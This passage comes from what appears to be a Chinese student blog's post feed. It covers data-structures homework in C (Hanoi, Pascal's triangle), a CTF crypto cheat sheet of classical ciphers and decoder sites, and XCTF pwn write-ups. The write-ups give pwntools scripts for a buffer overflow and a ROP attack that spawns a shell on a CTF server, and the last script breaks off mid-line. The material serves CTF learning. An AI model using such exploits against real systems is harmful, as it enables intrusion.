el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> study </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> Algorithm </tag>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次有趣的东西及数据结构作业</title>
      <link href="/posts/shujujiegouhome/"/>
      <url>/posts/shujujiegouhome/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>最近复习数据结构，发现了一些有趣的东西，哈哈哈，记录一下；</p><a id="more"></a><h1 id="汉诺塔"><a class="markdownIt-Anchor" href="#汉诺塔"></a> 汉诺塔</h1><p>汉诺塔相信大家都略有耳闻，这里就不多解释；</p><p>数据结构课上，讲到了汉诺塔问题——“利用递归求解移动过程”，那我就不得不拿出来以前的代码（不，还是自己</p><p>回忆写一下比较好😄），这个其实早就学过了，之前刷acm的题目，做过好几道汉诺塔问题，但是没这么简单😭</p><p>话不多说，直接上code：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>; <span class="comment">//全局变量，计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> x,<span class="keyword">char</span> y)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%c-&gt;%c\n"</span>,x,y); <span class="comment">//x柱拿一个圆盘移动到y柱</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> a,<span class="keyword">char</span> b,<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>) <span class="comment">//只有一个圆盘</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">move</span>(a,c); <span class="comment">//直接从a移动到c</span></span><br><span class="line">count ++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">hanoi(n<span class="number">-1</span>,a,c,b); <span class="comment">//n-1个圆盘从a借助c移动到b</span></span><br><span class="line"><span class="built_in">move</span>(a,c); <span class="comment">//a中剩下的一个圆盘移动到c</span></span><br><span class="line">count ++;</span><br><span class="line">hanoi(n<span class="number">-1</span>,b,a,c); <span class="comment">//移动到b的n-1个圆盘从b借助a移动到c</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入圆盘数："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">hanoi(n,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n需要移动的次数为：%d"</span>,count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>汉诺塔问题算是纯递归的啦，很简单呐😜</p><h1 id="杨辉三角"><a class="markdownIt-Anchor" href="#杨辉三角"></a> 杨辉三角</h1><h3 id="队列实现"><a class="markdownIt-Anchor" href="#队列实现"></a> 队列实现</h3><p>这个是老师留的作业，哇，好难写，这真够我写一晚上的啦</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    ElemType data[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> front,rear;</span><br><span class="line">}Queue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitQueue</span><span class="params">(Queue *Q)</span> <span class="comment">//初始化队列</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EmptyQueue</span><span class="params">(Queue *Q)</span> <span class="comment">//判断队列是否为空</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> Q-&gt;rear == Q-&gt;front;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnQueue</span><span class="params">(Queue *Q, ElemType e)</span> <span class="comment">//入队 </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == MAXSIZE)</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    Q-&gt;data[Q-&gt;rear] = e;</span><br><span class="line">    Q-&gt;rear ++;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeQueue</span><span class="params">(Queue *Q,ElemType *e)</span> <span class="comment">//出队</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == Q-&gt;front)</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    *e = Q-&gt;data[Q-&gt;front];</span><br><span class="line">    Q-&gt;front ++;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetHeadData</span><span class="params">(Queue *Q,ElemType *e)</span> <span class="comment">//获取队头元素</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(EmptyQueue(Q))</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">        *e = Q-&gt;data[Q-&gt;front];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yanghui</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">//杨辉三角实现函数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Queue Q;</span><br><span class="line">    <span class="keyword">int</span> i,x,e,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);  <span class="comment">//单独打印第一行数字1 ，需要控制格式 </span></span><br><span class="line">    }   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1\n"</span>); <span class="comment">// print(1) </span></span><br><span class="line">    </span><br><span class="line">    InitQueue(&amp;Q);</span><br><span class="line">    EnQueue(&amp;Q,<span class="number">0</span>);</span><br><span class="line">    EnQueue(&amp;Q,<span class="number">1</span>);</span><br><span class="line">    EnQueue(&amp;Q,<span class="number">1</span>); <span class="comment">//队列初始化 </span></span><br><span class="line">    <span class="keyword">while</span>(++k&lt;n) <span class="comment">//输出后n-1行 </span></span><br><span class="line">{</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n-k;i++)</span><br><span class="line">{</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"   "</span>); <span class="comment">//控制格式，采取"3的倍数格式控制" </span></span><br><span class="line">        }</span><br><span class="line">        EnQueue(&amp;Q,<span class="number">0</span>); <span class="comment">//入队0，为while和if判断 </span></span><br><span class="line">e = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(e!=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">        DeQueue(&amp;Q,&amp;x);</span><br><span class="line">            GetHeadData(&amp;Q,&amp;e);</span><br><span class="line">            <span class="keyword">if</span>(e)</span><br><span class="line">{</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%-6d"</span>,e);</span><br><span class="line">            }</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            EnQueue(&amp;Q,x+e); <span class="comment">//入队-&gt;每个数等于它上方两数之和 </span></span><br><span class="line">}</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入需要打印的行数："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    yanghui(n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92_%E9%98%9F%E5%88%97.png" alt="杨辉三角_队列"></p><h3 id="c语言实现"><a class="markdownIt-Anchor" href="#c语言实现"></a> C语言实现</h3><p>杨辉三角用C语言打印更简单！！🙃</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> n,i,j,k,a[<span class="number">100</span>][<span class="number">100</span>];  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入需要打印的行数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    {</span><br><span class="line">    a[i][<span class="number">1</span>] = a[i][i] = <span class="number">1</span>;  <span class="comment">//每一行第一个和最后一个数字为1 </span></span><br><span class="line">} </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">3</span>;i&lt;=n;i++) <span class="comment">//这里从第三行开始，因为前两行全部是数字1，已经赋值完毕 </span></span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">2</span>;j&lt;=i<span class="number">-1</span>;j++) <span class="comment">//每一行从第二个数字开始 </span></span><br><span class="line">        {</span><br><span class="line">        a[i][j]=a[i<span class="number">-1</span>][j<span class="number">-1</span>]+a[i<span class="number">-1</span>][j]; <span class="comment">//每个数字等于它上方两数之和 </span></span><br><span class="line">}</span><br><span class="line">}            </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) <span class="comment">//从第一行开始输出 </span></span><br><span class="line">{</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">1</span>;k&lt;=n-i+<span class="number">1</span>;k++) <span class="comment">//控制格式 </span></span><br><span class="line">        {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>); </span><br><span class="line">}</span><br><span class="line">           </span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)  </span><br><span class="line">        {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%-6d"</span>,a[i][j]); <span class="comment">//左对齐，输出 </span></span><br><span class="line">} </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);  </span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92_C%E8%AF%AD%E8%A8%80.png" alt="杨辉三角_C语言"></p><h3 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结😋</h3><p>数据结构挺好玩的，我之前的blog有整理，欢迎大家去康康😁</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> study </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>烧脑的密码——花里胡哨</title>
      <link href="/posts/crypto/"/>
      <url>/posts/crypto/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>最近学习pwn，又累又自闭=_=我觉得还得抓抓crypto才行，主打pwn，副业crypto，perfect ！！😊</p><p>这篇博文就对crypto做个小总结吧，会不定时的更新，毕竟现在学的也不都多，学无止境哈哈哈；</p><a id="more"></a><h1 id="16进制文本"><a class="markdownIt-Anchor" href="#16进制文本"></a> 16进制—&gt;文本</h1><p>这个是我做题以来，用到的最多的一种</p><p>解密网站1：<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制文本转换</a></p><p>解密网站2：<a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">16进制文本转换</a></p><h1 id="base"><a class="markdownIt-Anchor" href="#base"></a> Base</h1><p>先来个简单的Base加密</p><p>Base是一个大家族，有Base16，Base32，Base64…多种加密，常用的是Base64加密，通常Base64有个特征：</p><p>由于它的加密方法问题，常常以 <code>"= ="</code> 结尾</p><p>解密网站：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a></p><h1 id="morse"><a class="markdownIt-Anchor" href="#morse"></a> Morse</h1><p>摩斯密码，很多人都听说过吧应该，就是由 <code>"."</code> 和 <code>"-"</code> 组成</p><p>e.g.    <code>-.-./-/..-.</code>  ——&gt;  <code>CTF</code></p><p>解密网站：<a href="https://tool.lu/morse/" target="_blank" rel="noopener">Morse</a></p><h1 id="caesar"><a class="markdownIt-Anchor" href="#caesar"></a> Caesar</h1><p>凯撒密码，这个原理也很简单，就是每一个字母往后移动相同的位数</p><p>解密网站： <a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">Caesar</a></p><h1 id="rot13"><a class="markdownIt-Anchor" href="#rot13"></a> ROT13</h1><p>ROT13，每个字母回转13位</p><p>解密网站：<a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html" target="_blank" rel="noopener">ROT13</a></p><h1 id="md5"><a class="markdownIt-Anchor" href="#md5"></a> md5</h1><p>md5，这个不好解释，直接放网站吧</p><p>解密网站：<a href="https://pmd5.com/" target="_blank" rel="noopener">MD5</a></p><h1 id="培根密码"><a class="markdownIt-Anchor" href="#培根密码"></a> 培根密码</h1><p>培根密码，由<code>A(a)</code>，<code>B(b)</code>组成，代表的是数学中的0和1</p><p>解密网站：<a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">培根密码</a></p><h1 id="栅栏密码"><a class="markdownIt-Anchor" href="#栅栏密码"></a> 栅栏密码</h1><p>栅栏密码，把明文分为N个一组，把每一组的第一个字符组合，第二个字符组合…第N个字符组合，然后连起来就</p><p>是一段栅栏密码了</p><p>e.g.   （以2栏栅栏为例：）</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">明文：I Love CTF </span><br><span class="line">去空格：ILoveCTF</span><br><span class="line">分组：IL ov eC TF</span><br><span class="line">第一组：IoeT</span><br><span class="line">第二组：LvCF</span><br><span class="line">密文：IoeTLvCF</span><br></pre></td></tr></tbody></table></figure><p>解密网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码</a></p><p>还有一种栅栏密码叫做<code>W型栅栏密码</code> 解密网站：<a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">W型栅栏密码</a></p><h1 id="ook-brainfuck"><a class="markdownIt-Anchor" href="#ook-brainfuck"></a> Ook &amp; Brainfuck</h1><p>Ook，这个很有意思😂，形如：<code>Ook. Ook! Ook?</code> 这样的就是Ook加密</p><p>Brainfuck，这个也很有意思，形如：<code>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[</code></p><p>这样的就是Brainfuck加密😁</p><p>解密网站： <a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">Ook &amp; Brainfuck</a></p><h1 id="quipqiup"><a class="markdownIt-Anchor" href="#quipqiup"></a> quipqiup</h1><p>quipqiup，这个是把一段英文，每个字母替换为另一个指定的字母的加密</p><p>解密网站：<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a></p><h1 id="与佛论禅"><a class="markdownIt-Anchor" href="#与佛论禅"></a> 与佛论禅</h1><p>这个没什么好解释的</p><p>解密网站：</p><p><a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a></p><h1 id="键盘密码"><a class="markdownIt-Anchor" href="#键盘密码"></a> 键盘密码</h1><p>键盘密码，更没法说，把密文在键盘上找到位置，有时候连成的轨迹是一个字母，有时候是围着一个字母</p><p>还有手机9键密码，比如666，就是键盘”6“上的第三个字母”O“ …根据情况定吧，变化很多~</p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><p>这里放一些不知道原理，只会根据题目来解的加密：</p><p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">AES</a>  <a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit</a>  <a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent</a>   <a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">Quoted-printable</a>   <a href="http://code.mcdvisa.com" target="_blank" rel="noopener">中文电码</a></p><h1 id="tools"><a class="markdownIt-Anchor" href="#tools"></a> Tools</h1><p><a href="http://www.atoolbox.net/Category.php?Id=27" target="_blank" rel="noopener">加密解密工具</a></p><p><a href="https://blog.csdn.net/weixin_42037232/article/details/89018997?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">密码积累网站</a></p><p><a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">二维码</a></p><p><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">PDF转-&gt;**</a></p><p><a href="http://ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">CTF在线工具</a></p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF资源库</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF—WP</title>
      <link href="/posts/xctf-wp/"/>
      <url>/posts/xctf-wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博客呢，就记录一些平时在XCTF刷的题目的wp，可能整理不开，会分支放；</p><a id="more"></a><h1 id="hello_pwn"><a class="markdownIt-Anchor" href="#hello_pwn"></a> Hello_pwn</h1><p>这个算是第一篇wp了吧，不足之处，还请多多指教；</p><p>拿到题目，按照惯例，先查看保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_1.png" alt="hello_pwn_1"></p><p>可以看到，开了NX，未开canary，丢进ida查看伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_2.png" alt="hello_pwn_2"></p><p>可以看到这里，先读取一个字符串，再判断如果dword = 1853186401，执行下面那个函数，点进去看：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_3.png" alt="hello_pwn_3"></p><p>这里直接给了flag了，思路就清晰了吧：只要让<code>dword</code> = 1853186401就可以了</p><p>但是读取的是<code>unk</code>，判断的确是<code>dword</code>，那就看看它们的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_4.png" alt="hello_pwn_4"></p><p>可以看到，unk和dword偏移量是4个字节，这就好办了呀😁</p><p>直接看exp吧：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">49503</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><p>这样就做出来了，\(●ˇ∀ˇ●)/</p><h1 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> level2</h1><p>这道题题目也给出了，考察的ROP，算是很简单的一道题了；</p><p>先查看保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_1.png" alt="level2_1"></p><p>开了NX，没有canary</p><p>丢进ida，查看伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_2.png" alt="level2_2"></p><p>点进vulnerable_function()函数，查看一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_3.png" alt="level2_3"></p><p>这里我们发现，read函数极易造成栈溢出漏洞，点进buf，查看空间分配：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_4.png" alt="level2_4"></p><p>这里有buf长度 = （0x88 + 0x4）</p><p>然后搜索字符串，发现"/bin/sh" ,点击进去：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_5.png" alt="level2_5"></p><p>这里就应该清楚了，利用栈溢出漏洞，构造payload覆盖到"/bin/sh"，直接获取shell，那么还得需要寻找system的地址，再寻找一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_6.png" alt="level2_6"></p><p>到这里就全部清楚了，上exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54298</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">system = <span 